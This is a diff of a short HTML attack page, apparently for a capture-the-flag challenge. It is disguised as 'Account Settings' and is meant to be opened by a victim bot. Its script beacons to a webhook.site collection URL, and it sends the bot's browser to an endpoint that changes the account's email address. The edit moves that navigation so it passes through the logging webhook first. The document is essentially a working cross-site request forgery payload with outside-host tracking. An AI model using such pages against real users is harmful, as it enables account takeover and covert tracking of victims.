@@ -1,18 +1,17 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Account Settings</title>
-  </head>
-  <body>
-    <p>Getting flag...</p>
-    <script>
-      // Beacon: confirms this page's JS executed in the bot's browser,
-      // separate from whether the CSRF request itself worked.
-      new Image().src = "https://webhook.site/348d6e64-c06d-4202-826f-7ee825b6f32a?stage=loaded";
+<head>
+<meta charset="UTF-8" />
+<title>Account Settings</title>
+</head>
+<body>
+<p>Getting flag...</p>
+<script>
+  // Log the beacon (subresource — confirms JS runs; cookie NOT expected here, that's fine)
+  new Image().src = "https://webhook.site/348d6e64-c06d-4202-826f-7ee825b6f32a?stage=loaded";
 
-      location.href =
-        "http://100.101.228.35:6009/settings/email?new=newemail@example.com";
-    </script>
-  </body>
+  // Top-level navigation — goes through webhook.site (logged), then 302s to the real target
+  location.href = "https://webhook.site/348d6e64-c06d-4202-826f-7ee825b6f32a?stage=nav";
+</script>
+</body>
 </html>
